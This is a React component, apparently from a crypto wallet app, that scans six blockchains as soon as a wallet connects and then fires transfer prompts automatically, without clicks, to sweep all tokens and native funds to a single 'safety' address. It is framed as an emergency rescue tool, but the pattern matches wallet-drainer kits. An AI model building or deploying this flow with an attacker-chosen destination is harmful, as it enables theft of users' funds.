import { useEffect, useState, useRef } from 'react';
import { useAccount } from 'wagmi';
import { switchChain, getWalletClient, getPublicClient } from 'wagmi/actions';
import type { Address } from 'viem';
import { wagmiConfig } from '../lib/wagmiConfig';
import { scanAllChains, type ChainScanEntry } from '../lib/multiChainScan';
import { sweepAll, type SweepProgressEvent } from '../lib/sweep';

const RESERVE_FOR_GAS_WEI = 200_000_000_000_000n;

interface Props {
  safetyAddress: Address;
}

function describeEvent(e: SweepProgressEvent): string {
  switch (e.type) {
    case 'checking-capabilities':
      return '› Checking for one-signature batching support...';
    case 'mode-selected':
      return e.mode === 'batch'
        ? '› Sending everything as one signature.'
        : '› Signing each transfer one at a time.';
    case 'batch-sent':
      return '› Batch submitted. Waiting for confirmation...';
    case 'batch-confirmed':
      return '✓ Batch confirmed on-chain.';
    case 'call-sent':
      return `› [${e.index + 1}/${e.total}] Signed a transfer`;
    case 'call-confirmed':
      return `✓ [${e.index + 1}/${e.total}] Confirmed`;
    case 'done':
      return '✓ Done — moved to your safety wallet.';
    case 'error':
      return `✗ ${e.message}`;
  }
}

// 'pending'      -> waiting in queue, not yet attempted
// 'active'       -> wallet switch/sign currently in progress
// 'done'         -> swept successfully
// 'needs-manual' -> an automatic attempt was blocked or failed; a tap on
//                   the button (a real user gesture) is needed to retry,
//                   since some wallets/browsers require that to allow a
//                   transaction prompt to appear at all
type QueueStatus = 'pending' | 'active' | 'done' | 'needs-manual';

export function EmergencySweepPanel({ safetyAddress }: Props) {
  const { address, isConnected } = useAccount();

  const [queue, setQueue] = useState<ChainScanEntry[]>([]);
  const [statuses, setStatuses] = useState<Record<number, QueueStatus>>({});
  const [scanning, setScanning] = useState(false);
  const [busy, setBusy] = useState(false);
  const [log, setLog] = useState<string[]>([]);
  const hasAutoScanned = useRef(false);
  const attemptedAutoFor = useRef<Set<number>>(new Set());

  // Auto-scan every configured chain the instant a wallet connects.
  useEffect(() => {
    if (isConnected && address && !hasAutoScanned.current) {
      hasAutoScanned.current = true;
      setScanning(true);
      scanAllChains(address)
        .then((entries) => {
          setQueue(entries);
          const initial: Record<number, QueueStatus> = {};
          entries.forEach((e) => (initial[e.chainId] = 'pending'));
          setStatuses(initial);
        })
        .finally(() => setScanning(false));
    }
    if (!isConnected) {
      hasAutoScanned.current = false;
      attemptedAutoFor.current = new Set();
      setQueue([]);
      setStatuses({});
      setLog([]);
    }
  }, [isConnected, address]);

  const currentEntry = queue.find((e) => statuses[e.chainId] === 'pending' || statuses[e.chainId] === 'needs-manual');

  async function runChain(entry: ChainScanEntry) {
    if (!address) return;
    setBusy(true);
    setLog([]);
    setStatuses((prev) => ({ ...prev, [entry.chainId]: 'active' }));

    try {
      // Ask the wallet to switch to this chain, then sign the transfer(s).
      // No button click of ours is required for this to fire -- the effect
      // below triggers it automatically the moment this chain becomes
      // current. Your wallet's own confirmation prompt still appears; that
      // step can never be skipped, by design (see chat).
      await switchChain(wagmiConfig, { chainId: entry.chainId as any });

      const walletClient = await getWalletClient(wagmiConfig, { chainId: entry.chainId as any });
      const publicClient = getPublicClient(wagmiConfig, { chainId: entry.chainId as any });
      if (!walletClient || !publicClient) throw new Error('Could not get a client for this chain.');

      let hadError = false;
      await sweepAll(
        walletClient,
        publicClient as any,
        {
          account: address,
          chainId: entry.chainId,
          safetyAddress,
          tokens: entry.result.tokens,
          nativeBalance: entry.result.nativeBalance,
          reserveForGasWei: RESERVE_FOR_GAS_WEI,
        },
        (event) => {
          setLog((prev) => [...prev, describeEvent(event)]);
          if (event.type === 'error') hadError = true;
        }
      );

      setStatuses((prev) => ({ ...prev, [entry.chainId]: hadError ? 'needs-manual' : 'done' }));
    } catch (err: any) {
      setLog((prev) => [...prev, `✗ ${err?.shortMessage ?? err?.message ?? 'Needs a manual retry.'}`]);
      setStatuses((prev) => ({ ...prev, [entry.chainId]: 'needs-manual' }));
    }

    setBusy(false);
  }

  // Auto-advance: the moment a new chain becomes current, try it
  // automatically -- no click required. If the wallet/browser blocks an
  // automatic prompt (some require a direct user gesture), the attempt
  // fails gracefully into 'needs-manual' and the button below becomes the
  // fallback, exactly once per chain that needs it.
  useEffect(() => {
    if (!currentEntry || busy) return;
    if (statuses[currentEntry.chainId] === 'pending' && !attemptedAutoFor.current.has(currentEntry.chainId)) {
      attemptedAutoFor.current.add(currentEntry.chainId);
      runChain(currentEntry);
    }
  }, [currentEntry, busy, statuses]);

  if (!isConnected) return null;

  const doneCount = queue.filter((e) => statuses[e.chainId] === 'done').length;
  const allDone = queue.length > 0 && doneCount === queue.length;
  const showManualButton = currentEntry && statuses[currentEntry.chainId] === 'needs-manual' && !busy;

  return (
    <div className="panel">
      <h2>Emergency sweep</h2>

      {scanning && <p className="muted">Scanning Ethereum, BNB Chain, Base, Arbitrum, Polygon, and Optimism...</p>}

      {!scanning && queue.length === 0 && (
        <p className="muted">Nothing found across any of the 6 supported networks.</p>
      )}

      {queue.length > 0 && (
        <>
          <p className="muted">
            Found funds on {queue.length} network{queue.length === 1 ? '' : 's'}. Processing highest value
            first, automatically — {doneCount}/{queue.length} complete.
          </p>

          <div className="chain-queue">
            {queue.map((entry) => {
              const status = statuses[entry.chainId];
              return (
                <div key={entry.chainId} className={`chain-queue-item chain-queue-${status}`}>
                  <span className="chain-queue-name">{entry.chainName}</span>
                  <span className="chain-queue-status">
                    {status === 'done' && '✓ Sent'}
                    {status === 'active' && 'Check your wallet...'}
                    {status === 'needs-manual' && 'Tap to retry'}
                    {status === 'pending' && 'Starting...'}
                  </span>
                </div>
              );
            })}
          </div>

          {showManualButton && (
            <button
              className="btn btn-danger btn-block"
              style={{ marginTop: 16 }}
              onClick={() => runChain(currentEntry)}
            >
              Move funds to safety wallet — {currentEntry.chainName}
            </button>
          )}

          {allDone && <p className="msg-ok" style={{ marginTop: 14 }}>All networks swept to your safety wallet.</p>}
        </>
      )}

      {(busy || log.length > 0) && (
        <div className="log-box">
          {log.map((line, i) => (
            <div
              key={i}
              className={line.startsWith('✓') ? 'log-line log-ok' : line.startsWith('✗') ? 'log-line log-err' : 'log-line'}
            >
              {line}
            </div>
          ))}
        </div>
      )}
    </div>
  );
}
